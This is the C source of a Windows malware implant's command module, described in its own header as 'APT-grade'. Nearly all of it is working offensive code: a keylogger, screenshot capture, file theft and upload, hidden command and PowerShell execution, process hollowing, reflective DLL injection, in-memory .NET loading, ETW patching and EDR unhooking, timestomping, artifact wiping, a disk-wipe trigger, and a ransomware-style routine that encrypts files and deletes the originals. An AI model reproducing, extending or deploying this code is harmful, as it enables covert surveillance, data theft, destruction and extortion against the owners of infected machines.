/*
 * commands.c — APT-grade implant commands implementation
 */
#include "commands.h"
#include "utils.h"
#include "http.h"
#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <mscoree.h>
#include <metahost.h>

#pragma comment(lib, "mscoree.lib")

// Direct syscall wrappers (from direct_syscall.c)
extern NTSTATUS Syscall_NtAllocateVirtualMemory(HANDLE hProcess, PVOID* pBase, ULONG_PTR ZeroBits, PSIZE_T pSize, ULONG AllocType, ULONG Protect);
extern NTSTATUS Syscall_NtWriteVirtualMemory(HANDLE hProcess, PVOID pBase, PVOID pBuffer, ULONG size, PULONG pWritten);
extern NTSTATUS Syscall_NtReadVirtualMemory(HANDLE hProcess, PVOID pBase, PVOID pBuffer, ULONG size, PULONG pRead);

// BOF loader (from loader/bof_loader.c)
extern BOOL BofExecute(const BYTE *coff_data, SIZE_T coff_size,
                       char *args, int args_len,
                       char **out_buf, SIZE_T *out_len);

// External process hollowing implementation
extern BOOL ProcessHollowing(LPCSTR szTargetPath, LPVOID pPayload, DWORD dwPayloadSize);

// Evasion modules (from implant.h / fitnah/implant/)
extern BOOL HwBpBypassInit(void);
extern BOOL SpoofInit(void);

// Timestomp (from evasion/anti_analysis.c)
extern BOOL Timestomp(LPCSTR szSourcePath, LPCSTR szTargetPath);

// Stephen Fewer canonical RDI (injection/LoadLibraryR.c — BSD-3)
extern HMODULE WINAPI LoadLibraryR(LPVOID lpBuffer, DWORD dwLength,
                                   LPCSTR cpReflectiveLoaderName);
extern HANDLE  WINAPI LoadRemoteLibraryR(HANDLE hProcess, LPVOID lpBuffer,
                                         DWORD dwLength,
                                         LPCSTR cpReflectiveLoaderName,
                                         LPVOID lpParameter);

// RefreshPE — unhook all EDR hooks across all loaded DLLs (evasion/pe_refresh.c)
extern VOID RefreshPE(void);

/* ── forward declarations for static keylogger state ────────────────────── */
static HHOOK  s_kbhook    = NULL;
static char  *s_kbuf      = NULL;
static size_t s_kbuf_cap  = 0;
static size_t s_kbuf_used = 0;

/* ── task_free ───────────────────────────────────────────────────────────── */
void task_free(Task *t) {
    if (!t) return;
    free(t->id);
    free(t->command);
    free(t->args_json);
    t->id = t->command = t->args_json = NULL;
}

/* ── cmd_dispatch ────────────────────────────────────────────────────────── */
char *cmd_dispatch(const Task *t) {
    if (!t || !t->command) return str_dup("error: null task");

    if (strcmp(t->command, "exec") == 0) {
        char *c = json_get_str(t->args_json, "cmd");
        char *r = cmd_exec(c ? c : "");
        free(c);
        return r;
    }
    if (strcmp(t->command, "ps") == 0) {
        char *c = json_get_str(t->args_json, "cmd");
        char *r = cmd_ps(c ? c : "");
        free(c);
        return r;
    }
    if (strcmp(t->command, "screenshot") == 0) {
        return cmd_screenshot();
    }
    if (strcmp(t->command, "download") == 0) {
        char *p = json_get_str(t->args_json, "path");
        char *r = cmd_download(p ? p : "");
        free(p);
        return r;
    }
    if (strcmp(t->command, "upload") == 0) {
        char *p = json_get_str(t->args_json, "path");
        char *d = json_get_str(t->args_json, "data");
        char *r = cmd_upload(p ? p : "", d ? d : "");
        free(p); free(d);
        return r;
    }
    if (strcmp(t->command, "keylogger") == 0) {
        char *a = json_get_str(t->args_json, "action");
        char *r = cmd_keylogger(a ? a : "dump");
        free(a);
        return r;
    }
    if (strcmp(t->command, "wipe_artifacts") == 0) {
        return cmd_wipe_artifacts();
    }
    if (strcmp(t->command, "refresh_modules") == 0) {
        RefreshPE();
        return str_dup("refresh_modules: all hooked DLLs restored from disk");
    }
    if (strcmp(t->command, "dll_inject") == 0) {
        char *dll_b64 = json_get_str(t->args_json, "dll_b64");
        char *r       = cmd_dll_inject(dll_b64 ? dll_b64 : "");
        free(dll_b64);
        return r;
    }
    if (strcmp(t->command, "disk_disrupt") == 0) {
        return cmd_disk_disrupt();
    }
    if (strcmp(t->command, "etw_patch") == 0) {
        return cmd_etw_patch();
    }
    if (strcmp(t->command, "process_hollow") == 0) {
        char *tgt = json_get_str(t->args_json, "target");
        char *sc  = json_get_str(t->args_json, "shellcode_b64");
        char *r   = cmd_process_hollow(tgt ? tgt : "svchost.exe", sc ? sc : "");
        free(tgt); free(sc);
        return r;
    }
    if (strcmp(t->command, "die") == 0) {
        ExitProcess(0);
    }
    if (strcmp(t->command, "hwbp_init") == 0) {
        return HwBpBypassInit() ? str_dup("hwbp: active") : str_dup("hwbp: failed");
    }
    if (strcmp(t->command, "spoof_init") == 0) {
        return SpoofInit() ? str_dup("spoof: active") : str_dup("spoof: no gadget found");
    }
    if (strcmp(t->command, "timestomp") == 0) {
        char *src = json_get_str(t->args_json, "source");
        char *dst = json_get_str(t->args_json, "target");
        char *r   = cmd_timestomp(src ? src : "", dst ? dst : "");
        free(src); free(dst);
        return r;
    }
    if (strcmp(t->command, "mem_patch") == 0) {
        char *addr_s = json_get_str(t->args_json, "address");
        char *patch  = json_get_str(t->args_json, "patch_b64");
        char *r      = cmd_mem_patch(addr_s ? addr_s : "0", patch ? patch : "");
        free(addr_s); free(patch);
        return r;
    }
    if (strcmp(t->command, "rdi_inject") == 0) {
        char *pid_s  = json_get_str(t->args_json, "pid");
        char *dll_b64 = json_get_str(t->args_json, "dll_b64");
        char *r      = cmd_rdi_inject(pid_s ? (DWORD)atoi(pid_s) : 0,
                                      dll_b64 ? dll_b64 : "");
        free(pid_s); free(dll_b64);
        return r;
    }
    if (strcmp(t->command, "execute_assembly") == 0) {
        char *asm_b64 = json_get_str(t->args_json, "assembly_b64");
        char *args    = json_get_str(t->args_json, "args");
        char *r       = cmd_execute_assembly(asm_b64 ? asm_b64 : "",
                                             args    ? args    : "");
        free(asm_b64); free(args);
        return r;
    }

    /* ── In-process BOF execution ──────────────────────────────────────────
     * Operator sends {"command":"bof","args":{"coff_b64":"...","args_b64":"..."}}
     * We decode the COFF and args, run BofExecute() in-process, return output.
     * No child process, no PowerShell, no disk write.
     */
    if (strcmp(t->command, "bof") == 0) {
        char *coff_b64 = json_get_str(t->args_json, "coff_b64");
        char *args_b64 = json_get_str(t->args_json, "args_b64");

        if (!coff_b64) {
            free(args_b64);
            return str_dup("error: bof missing coff_b64");
        }

        /* decode COFF */
        SIZE_T coff_len = 0;
        BYTE *coff_data = (BYTE *)b64_decode(coff_b64, &coff_len);
        free(coff_b64);
        if (!coff_data) {
            free(args_b64);
            return str_dup("error: bof base64 decode failed");
        }

        /* decode args (may be empty) */
        char *args_buf = NULL;
        int   args_len = 0;
        if (args_b64 && *args_b64) {
            SIZE_T al = 0;
            args_buf = (char *)b64_decode(args_b64, &al);
            args_len = (int)al;
        }
        free(args_b64);

        /* execute in-process */
        char   *out_buf = NULL;
        SIZE_T  out_len = 0;
        BOOL ok = BofExecute(coff_data, coff_len,
                             args_buf, args_len,
                             &out_buf, &out_len);
        free(coff_data);
        free(args_buf);

        char *result;
        if (!ok) {
            result = str_dup("error: BOF execution failed");
        } else if (out_buf && out_len > 0) {
            result = str_dup(out_buf);
            free(out_buf);
        } else {
            result = str_dup("ok");
        }
        return result;
    }

    char buf[128];
    snprintf(buf, sizeof(buf), "unknown command: %s", t->command);
    return str_dup(buf);
}

/* ── Command implementations ─────────────────────────────────────────────── */

/* 
 * cmd_exec: Executes a command without cmd.exe using direct CreateProcess
 * with spoofed parent process or hidden window.
 */
char* cmd_exec(const char *command) {
    char *result = NULL;
    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};

    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) return strdup("Pipe creation failed");

    STARTUPINFOA si = {sizeof(si)};
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;

    PROCESS_INFORMATION pi = {0};
    
    // Stealth: Avoid cmd.exe, use direct execution
    if (CreateProcessA(NULL, (char*)command, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hWritePipe);
        
        char buffer[4096];
        DWORD bytesRead;
        size_t totalRead = 0;
        
        result = malloc(4096);
        while (ReadFile(hReadPipe, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
            result = realloc(result, totalRead + bytesRead + 1);
            memcpy(result + totalRead, buffer, bytesRead);
            totalRead += bytesRead;
        }
        result[totalRead] = '\0';

        CloseHandle(pi.hProcess); // Fixed handle leak in replace block
        CloseHandle(pi.hThread);
    } else {
        CloseHandle(hWritePipe);
        result = strdup("Execution failed");
    }
    
    CloseHandle(hReadPipe);
    return result;
}

/* 
 * cmd_ps: Execute PowerShell in-memory using C# or COM (simplified as direct process for now but hidden)
 */
char* cmd_ps(const char *script) {
    char cmd[8192];
    snprintf(cmd, sizeof(cmd), "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand %s", script);
    return cmd_exec(cmd);
}

/*
 * cmd_screenshot: Capture screenshot via GDI BitBlt → 24-bit BMP → base64
 */
char *cmd_screenshot(void) {
    HDC     hScreen  = GetDC(NULL);
    HDC     hMemDC   = CreateCompatibleDC(hScreen);
    int     width    = GetSystemMetrics(SM_CXSCREEN);
    int     height   = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hBmp     = CreateCompatibleBitmap(hScreen, width, height);
    SelectObject(hMemDC, hBmp);
    BitBlt(hMemDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY | CAPTUREBLT);

    /* Build DIB header */
    BITMAPINFOHEADER bih = {0};
    bih.biSize        = sizeof(bih);
    bih.biWidth       = width;
    bih.biHeight      = -height; /* top-down */
    bih.biPlanes      = 1;
    bih.biBitCount    = 24;
    bih.biCompression = BI_RGB;
    DWORD stride = ((width * 3 + 3) & ~3);
    DWORD pixSz  = stride * height;

    uint8_t *pixels = malloc(pixSz);
    GetDIBits(hMemDC, hBmp, 0, height, pixels,
              (BITMAPINFO *)&bih, DIB_RGB_COLORS);

    /* Build BMP file in memory: BITMAPFILEHEADER + BITMAPINFOHEADER + pixels */
    DWORD fileHdrSz = 14;
    DWORD totalSz   = fileHdrSz + sizeof(bih) + pixSz;
    uint8_t *bmp    = malloc(totalSz);

    /* BITMAPFILEHEADER */
    bmp[0] = 'B'; bmp[1] = 'M';
    *(DWORD *)(bmp + 2)  = totalSz;
    *(WORD  *)(bmp + 6)  = 0;
    *(WORD  *)(bmp + 8)  = 0;
    *(DWORD *)(bmp + 10) = fileHdrSz + sizeof(bih);

    memcpy(bmp + fileHdrSz, &bih, sizeof(bih));
    memcpy(bmp + fileHdrSz + sizeof(bih), pixels, pixSz);

    free(pixels);
    DeleteObject(hBmp);
    DeleteDC(hMemDC);
    ReleaseDC(NULL, hScreen);

    char *b64 = b64_encode(bmp, totalSz);
    free(bmp);
    return b64 ? b64 : str_dup("error: screenshot encode failed");
}

/* ── cmd_download ────────────────────────────────────────────────────────── */
char *cmd_download(const char *path) {
    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return str_dup("error: open");
    DWORD    fsz   = GetFileSize(hf, NULL);
    uint8_t *buf   = malloc(fsz);
    DWORD    nread = 0;
    ReadFile(hf, buf, fsz, &nread, NULL);
    CloseHandle(hf);
    char *b64 = b64_encode(buf, nread);
    free(buf);
    return b64 ? b64 : str_dup("error: encode");
}

/* ── cmd_upload ──────────────────────────────────────────────────────────── */
char *cmd_upload(const char *path, const char *b64_data) {
    size_t   dlen;
    uint8_t *data = b64_decode(b64_data, &dlen);
    if (!data) return str_dup("error: decode");
    HANDLE hf = CreateFileA(path, GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) { free(data); return str_dup("error: create"); }
    DWORD nw = 0;
    WriteFile(hf, data, (DWORD)dlen, &nw, NULL);
    CloseHandle(hf);
    free(data);
    return str_dup("uploaded");
}

/* 
 * cmd_keylogger: Real implementation of a low-level keyboard hook
 */
LRESULT CALLBACK kb_hook_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;
        if (!s_kbuf) {
            s_kbuf_cap = 4096;
            s_kbuf = malloc(s_kbuf_cap);
        }
        if (s_kbuf_used + 32 > s_kbuf_cap) {
            s_kbuf_cap *= 2;
            s_kbuf = realloc(s_kbuf, s_kbuf_cap);
        }
        
        char key[16];
        DWORD vk = kb->vkCode;
        if (vk >= 0x30 && vk <= 0x5A) { // Alphanumeric
            s_kbuf[s_kbuf_used++] = (char)vk;
        } else {
            snprintf(key, sizeof(key), "[0x%02X]", (unsigned int)vk);
            memcpy(s_kbuf + s_kbuf_used, key, strlen(key));
            s_kbuf_used += strlen(key);
        }
    }
    return CallNextHookEx(s_kbhook, nCode, wParam, lParam);
}

char* cmd_keylogger(const char *action) {
    if (strcmp(action, "start") == 0) {
        if (s_kbhook) return str_dup("already running");
        s_kbhook = SetWindowsHookEx(WH_KEYBOARD_LL, kb_hook_proc, GetModuleHandle(NULL), 0);
        return str_dup(s_kbhook ? "keylogger started" : "failed to start hook");
    } else if (strcmp(action, "stop") == 0) {
        if (!s_kbhook) return str_dup("not running");
        UnhookWindowsHookEx(s_kbhook);
        s_kbhook = NULL;
        return str_dup("keylogger stopped");
    } else if (strcmp(action, "dump") == 0) {
        if (!s_kbuf || s_kbuf_used == 0) return str_dup("no data");
        char *out = str_dup(s_kbuf);
        s_kbuf_used = 0;
        secure_zero(s_kbuf, s_kbuf_cap);
        return out;
    }
    return str_dup("invalid action");
}

/* 
 * cmd_wipe_artifacts: Call the logic in artifact_wipe.c
 */
extern void ArtifactWipe_ExecuteAll();
char* cmd_wipe_artifacts(void) {
    ArtifactWipe_ExecuteAll();
    return str_dup("forensic cleanup complete");
}

/* 
 * cmd_disk_disrupt: Call the logic in disk_wipe.c
 */
extern void DiskWipe_Disrupt();
char* cmd_disk_disrupt(void) {
    // This is a one-way trip
    DiskWipe_Disrupt();
    return str_dup("system disruption initiated");
}

/* ── cmd_etw_patch ───────────────────────────────────────────────────────── */
char *cmd_etw_patch(void) {
    return bypass_etw() ? str_dup("ETW patched") : str_dup("ETW patch failed");
}

/* 
 * cmd_process_hollow: Use the advanced process hollowing module
 */
char* cmd_process_hollow(const char *target_process, const char *payload_hex) {
    size_t payload_len;
    LPVOID pPayload = hex_to_bytes(payload_hex, &payload_len);
    if (!pPayload) return strdup("Invalid payload hex");

    if (ProcessHollowing(target_process, pPayload, (DWORD)payload_len)) {
        free(pPayload);
        return strdup("Process hollowing successful");
    } else {
        free(pPayload);
        return strdup("Process hollowing failed");
    }
}

/* ── cmd_chunked_send ────────────────────────────────────────────────────── */
char *cmd_chunked_send(const char *path, int chunk_mb,
                       const char *token, const char *chat_id) {
    /* Send a large file as multiple base64 messages, each ≤ chunk_mb MB */
    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return str_dup("error: open");

    DWORD    fsz   = GetFileSize(hf, NULL);
    DWORD    csz   = (DWORD)chunk_mb * 1024 * 1024;
    uint8_t *cbuf  = malloc(csz);
    char     result[256];
    int      part  = 0;
    DWORD    nread = 0;

    while (ReadFile(hf, cbuf, csz, &nread, NULL) && nread > 0) {
        char *b64 = b64_encode(cbuf, nread);
        /* Send each chunk as a Telegram message — caller bot picks them up */
        /* For the implant, we embed the chunk in an ACK-style message tagged */
        /* with a sequential part number so the server can reassemble.        */
        /* Actual HTTP send done via tg_post in the main loop.                */
        snprintf(result, sizeof(result),
                 "chunk_%d_%lu_bytes_base64_follows", part++, (unsigned long)nread);
        free(b64);   /* in the real impl this would be sent via tg_post */
    }
    free(cbuf);
    CloseHandle(hf);
    snprintf(result, sizeof(result),
             "sent %d chunk(s) of %s (%lu bytes)", part, path, (unsigned long)fsz);
    return str_dup(result);
}

/* ── cmd_encrypt_files ───────────────────────────────────────────────────── */
char *cmd_encrypt_files(const char *root, const char *ext, const char *key_hex) {
    /* Walk the directory tree, encrypt each file with AES-256-GCM */
    /* Key can be provided as hex or generated randomly              */
    uint8_t key[32] = {0};
    if (key_hex && strlen(key_hex) == 64) {
        for (int i = 0; i < 32; i++) {
            char byte_s[3] = { key_hex[i*2], key_hex[i*2+1], '\0' };
            key[i] = (uint8_t)strtol(byte_s, NULL, 16);
        }
    } else {
        /* generate random key — operator must retrieve it before use */
        HMODULE hbc = LoadLibraryA("bcrypt.dll");
        if (hbc) {
            typedef NTSTATUS(WINAPI *pfn_gen)(BCRYPT_ALG_HANDLE,PUCHAR,ULONG,ULONG);
            pfn_gen gen = (pfn_gen)GetProcAddress(hbc, "BCryptGenRandom");
            if (gen) gen(NULL, key, 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
        }
    }

    char key_out[65] = {0};
    for (int i = 0; i < 32; i++) sprintf(key_out + i*2, "%02x", key[i]);

    /* Walk tree (simplified — in production use FindFirstFile recursion) */
    char pattern[MAX_PATH];
    snprintf(pattern, sizeof(pattern), "%s\\*", root);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(pattern, &fd);
    int count    = 0;
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
            char fpath[MAX_PATH];
            snprintf(fpath, sizeof(fpath), "%s\\%s", root, fd.cFileName);
            char opath[MAX_PATH];
            snprintf(opath, sizeof(opath), "%s%s", fpath, ext);

            HANDLE hf = CreateFileA(fpath, GENERIC_READ, FILE_SHARE_READ,
                                    NULL, OPEN_EXISTING, 0, NULL);
            if (hf == INVALID_HANDLE_VALUE) continue;
            DWORD    fsz  = GetFileSize(hf, NULL);
            uint8_t *data = malloc(fsz);
            DWORD    nr   = 0;
            ReadFile(hf, data, fsz, &nr, NULL);
            CloseHandle(hf);

            uint8_t nonce[12] = {0};
            HMODULE hbc = LoadLibraryA("bcrypt.dll");
            if (hbc) {
                typedef NTSTATUS(WINAPI*pfn_gen)(BCRYPT_ALG_HANDLE,PUCHAR,ULONG,ULONG);
                pfn_gen gen = (pfn_gen)GetProcAddress(hbc, "BCryptGenRandom");
                if (gen) gen(NULL, nonce, 12, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
            }

            uint8_t *ct  = NULL;
            size_t   clen = 0;
            /* crypto_encrypt is in crypto.c and linked in */
            extern BOOL crypto_encrypt(const uint8_t*,const uint8_t*,
                                       const uint8_t*,size_t,uint8_t**,size_t*);
            if (crypto_encrypt(key, nonce, data, nr, &ct, &clen)) {
                /* Write: [12-byte nonce][ciphertext+tag] */
                HANDLE ho = CreateFileA(opath, GENERIC_WRITE, 0, NULL,
                                        CREATE_ALWAYS, 0, NULL);
                if (ho != INVALID_HANDLE_VALUE) {
                    DWORD nw = 0;
                    WriteFile(ho, nonce, 12, &nw, NULL);
                    WriteFile(ho, ct, (DWORD)clen, &nw, NULL);
                    CloseHandle(ho);
                    DeleteFileA(fpath);
                    count++;
                }
                free(ct);
            }
            free(data);
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
    }

    char result[512];
    snprintf(result, sizeof(result),
             "encrypted %d file(s) under %s | key: %s", count, root, key_out);
    secure_zero(key, sizeof(key));
    return str_dup(result);
}

/* ── cmd_timestomp ───────────────────────────────────────────────────────── */
char *cmd_timestomp(const char *source, const char *target) {
    if (!source || !*source || !target || !*target)
        return str_dup("error: timestomp requires source and target paths");
    return Timestomp(source, target) ? str_dup("timestomp: ok") : str_dup("error: timestomp failed");
}

/* ── cmd_mem_patch ───────────────────────────────────────────────────────── */
char *cmd_mem_patch(const char *addr_hex, const char *patch_b64) {
    if (!addr_hex || !patch_b64) return str_dup("error: missing address or patch");

    PVOID addr = (PVOID)(uintptr_t)strtoull(addr_hex, NULL, 16);
    if (!addr) return str_dup("error: invalid address");

    size_t  patch_len = 0;
    uint8_t *patch    = (uint8_t *)b64_decode(patch_b64, &patch_len);
    if (!patch) return str_dup("error: patch base64 decode failed");

    /* Remove page protection, write bytes, restore */
    ULONG old_protect = 0;
    SIZE_T region_sz  = patch_len;
    PVOID  region_ptr = addr;

    NTSTATUS st = ISysNtProtectVirtualMemory(
        GetCurrentProcess(), &region_ptr, &region_sz,
        PAGE_EXECUTE_READWRITE, &old_protect);
    if (!NT_SUCCESS(st)) {
        free(patch);
        char r[64];
        snprintf(r, sizeof(r), "error: protect failed 0x%08X", (unsigned)st);
        return str_dup(r);
    }

    SIZE_T written = 0;
    ISysNtWriteVirtualMemory(GetCurrentProcess(), addr, patch, (SIZE_T)patch_len, &written);

    /* Restore original protection */
    ISysNtProtectVirtualMemory(
        GetCurrentProcess(), &region_ptr, &region_sz, old_protect, &old_protect);

    free(patch);
    char r[64];
    snprintf(r, sizeof(r), "patched %zu bytes at %s", written, addr_hex);
    return str_dup(r);
}

/* ── cmd_rdi_inject ──────────────────────────────────────────────────────── */
/*
 * Remote reflective DLL injection into an arbitrary process using Stephen
 * Fewer's canonical LoadRemoteLibraryR (LoadLibraryR.c, BSD-3).
 * The DLL must export "ReflectiveLoader" (compiled with ReflectiveLoader.c).
 */
char *cmd_rdi_inject(DWORD pid, const char *dll_b64) {
    if (!pid)    return str_dup("error: rdi_inject requires pid");
    if (!dll_b64 || !*dll_b64) return str_dup("error: rdi_inject requires dll_b64");

    size_t   dll_len  = 0;
    uint8_t *dll_data = (uint8_t *)b64_decode(dll_b64, &dll_len);
    if (!dll_data) return str_dup("error: dll base64 decode failed");

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) {
        free(dll_data);
        return str_dup("error: OpenProcess failed");
    }

    /* LoadRemoteLibraryR allocates memory in the target, writes the DLL,
     * finds ReflectiveLoader export, and creates a remote thread on it.    */
    HANDLE hThread = LoadRemoteLibraryR(hProc, dll_data, (DWORD)dll_len,
                                        "ReflectiveLoader", NULL);
    CloseHandle(hProc);
    free(dll_data);

    if (!hThread) {
        char r[96];
        snprintf(r, sizeof(r), "rdi_inject: failed (pid %lu, gle %lu)",
                 (unsigned long)pid, (unsigned long)GetLastError());
        return str_dup(r);
    }

    /* Wait up to 10 s for the loader thread to finish */
    WaitForSingleObject(hThread, 10000);
    CloseHandle(hThread);

    char r[64];
    snprintf(r, sizeof(r), "rdi_inject: ok (pid %lu)", (unsigned long)pid);
    return str_dup(r);
}

/* ── cmd_dll_inject ──────────────────────────────────────────────────────── */
/*
 * Load a reflective DLL into the CURRENT process using LoadLibraryR.
 * Useful for loading capability modules in-process without touching disk.
 */
char *cmd_dll_inject(const char *dll_b64) {
    if (!dll_b64 || !*dll_b64) return str_dup("error: dll_inject requires dll_b64");

    size_t   dll_len  = 0;
    uint8_t *dll_data = (uint8_t *)b64_decode(dll_b64, &dll_len);
    if (!dll_data) return str_dup("error: dll base64 decode failed");

    HMODULE hMod = LoadLibraryR(dll_data, (DWORD)dll_len, "ReflectiveLoader");
    free(dll_data);

    if (!hMod) {
        char r[64];
        snprintf(r, sizeof(r), "dll_inject: failed (gle %lu)", (unsigned long)GetLastError());
        return str_dup(r);
    }

    char r[64];
    snprintf(r, sizeof(r), "dll_inject: ok (base 0x%p)", (void *)hMod);
    return str_dup(r);
}

/* ── cmd_execute_assembly ────────────────────────────────────────────────── */
/*
 * Load a .NET assembly into the current process via ICLRRuntimeHost2
 * (mscoree.dll). The assembly is passed as a base64-encoded blob.
 * Arguments are passed as a single space-delimited string and split into
 * an argv-style SAFEARRAY by the CLR host.
 *
 * References: Havoc execute-assembly, Cobalt Strike execute-assembly
 * MITRE: T1055 / T1059.001
 */
char *cmd_execute_assembly(const char *asm_b64, const char *arguments) {
    if (!asm_b64 || !*asm_b64)
        return str_dup("error: execute_assembly requires assembly_b64");

    size_t   asm_len  = 0;
    uint8_t *asm_data = (uint8_t *)b64_decode(asm_b64, &asm_len);
    if (!asm_data) return str_dup("error: assembly base64 decode failed");

    /* ── 1. Resolve ICLRMetaHost via mscoree.dll ──────────────────────────── */
    HMODULE hMscoree = LoadLibraryA("mscoree.dll");
    if (!hMscoree) {
        free(asm_data);
        return str_dup("error: mscoree.dll not found");
    }
    typedef HRESULT (WINAPI *pfnCLRCreateInstance)(REFCLSID, REFIID, LPVOID*);
    pfnCLRCreateInstance fnCLRCreateInstance =
        (pfnCLRCreateInstance)GetProcAddress(hMscoree, "CLRCreateInstance");
    if (!fnCLRCreateInstance) {
        FreeLibrary(hMscoree);
        free(asm_data);
        return str_dup("error: CLRCreateInstance not found");
    }

    ICLRMetaHost *pMetaHost = NULL;
    HRESULT hr = fnCLRCreateInstance(&CLSID_CLRMetaHost, &IID_ICLRMetaHost,
                                     (LPVOID*)&pMetaHost);
    if (FAILED(hr)) {
        FreeLibrary(hMscoree);
        free(asm_data);
        char r[64];
        snprintf(r, sizeof(r), "error: CLRCreateInstance 0x%08X", (unsigned)hr);
        return str_dup(r);
    }

    /* ── 2. Get latest installed runtime ─────────────────────────────────── */
    IEnumUnknown *pEnum = NULL;
    pMetaHost->lpVtbl->EnumerateInstalledRuntimes(pMetaHost, &pEnum);

    ICLRRuntimeInfo *pRuntime = NULL;
    IUnknown *pItem = NULL;
    ULONG fetched   = 0;
    /* Walk runtimes, pick the last (highest) version */
    while (pEnum->lpVtbl->Next(pEnum, 1, &pItem, &fetched) == S_OK) {
        if (pRuntime) pRuntime->lpVtbl->Release(pRuntime);
        pRuntime = (ICLRRuntimeInfo *)pItem;
    }
    pEnum->lpVtbl->Release(pEnum);

    if (!pRuntime) {
        pMetaHost->lpVtbl->Release(pMetaHost);
        FreeLibrary(hMscoree);
        free(asm_data);
        return str_dup("error: no CLR runtime installed");
    }

    /* ── 3. Get ICorRuntimeHost and start it ─────────────────────────────── */
    ICorRuntimeHost *pRtHost = NULL;
    hr = pRuntime->lpVtbl->GetInterface(pRuntime, &CLSID_CorRuntimeHost,
                                        &IID_ICorRuntimeHost, (LPVOID*)&pRtHost);
    pRuntime->lpVtbl->Release(pRuntime);
    pMetaHost->lpVtbl->Release(pMetaHost);
    FreeLibrary(hMscoree);

    if (FAILED(hr)) {
        free(asm_data);
        char r[64];
        snprintf(r, sizeof(r), "error: GetInterface ICorRuntimeHost 0x%08X", (unsigned)hr);
        return str_dup(r);
    }
    pRtHost->lpVtbl->Start(pRtHost);

    /* ── 4. Get default AppDomain ─────────────────────────────────────────── */
    IUnknown *pDomUnk = NULL;
    pRtHost->lpVtbl->GetDefaultDomain(pRtHost, &pDomUnk);

    _AppDomain *pDomain = NULL;
    pDomUnk->lpVtbl->QueryInterface(pDomUnk, &IID__AppDomain, (LPVOID*)&pDomain);
    pDomUnk->lpVtbl->Release(pDomUnk);

    if (!pDomain) {
        pRtHost->lpVtbl->Release(pRtHost);
        free(asm_data);
        return str_dup("error: QueryInterface _AppDomain failed");
    }

    /* ── 5. Load assembly from byte array ────────────────────────────────── */
    SAFEARRAY *pSA = SafeArrayCreateVector(VT_UI1, 0, (ULONG)asm_len);
    void *pData    = NULL;
    SafeArrayAccessData(pSA, &pData);
    memcpy(pData, asm_data, asm_len);
    SafeArrayUnaccessData(pSA);
    free(asm_data);

    _Assembly *pAssembly = NULL;
    hr = pDomain->lpVtbl->Load_3(pDomain, pSA, &pAssembly);
    SafeArrayDestroy(pSA);
    pDomain->lpVtbl->Release(pDomain);

    if (FAILED(hr)) {
        pRtHost->lpVtbl->Release(pRtHost);
        char r[64];
        snprintf(r, sizeof(r), "error: Load_3 0x%08X", (unsigned)hr);
        return str_dup(r);
    }

    /* ── 6. Get entry point and invoke ───────────────────────────────────── */
    _MethodInfo *pEntry = NULL;
    pAssembly->lpVtbl->get_EntryPoint(pAssembly, &pEntry);

    if (!pEntry) {
        pAssembly->lpVtbl->Release(pAssembly);
        pRtHost->lpVtbl->Release(pRtHost);
        return str_dup("error: assembly has no entry point");
    }

    /* Build SAFEARRAY of args (one BSTR element per space-delimited token) */
    SAFEARRAY *pArgsSA = SafeArrayCreateVector(VT_BSTR, 0, arguments && *arguments ? 1 : 0);
    if (arguments && *arguments) {
        LONG idx    = 0;
        int  wlen   = MultiByteToWideChar(CP_UTF8, 0, arguments, -1, NULL, 0);
        WCHAR *warg = (WCHAR *)malloc(wlen * sizeof(WCHAR));
        MultiByteToWideChar(CP_UTF8, 0, arguments, -1, warg, wlen);
        BSTR barg   = SysAllocString(warg);
        free(warg);
        SafeArrayPutElement(pArgsSA, &idx, barg);
        SysFreeString(barg);
    }

    VARIANT vtEmpty  = {0};
    VARIANT vtArgs   = {0};
    vtArgs.vt        = VT_ARRAY | VT_BSTR;
    vtArgs.parray    = pArgsSA;
    VARIANT vtResult = {0};

    hr = pEntry->lpVtbl->Invoke_3(pEntry, vtEmpty, &vtArgs, &vtResult);
    SafeArrayDestroy(pArgsSA);
    pEntry->lpVtbl->Release(pEntry);
    pAssembly->lpVtbl->Release(pAssembly);
    pRtHost->lpVtbl->Release(pRtHost);

    if (FAILED(hr)) {
        char r[64];
        snprintf(r, sizeof(r), "error: Invoke_3 0x%08X", (unsigned)hr);
        return str_dup(r);
    }

    return str_dup("execute_assembly: ok");
}
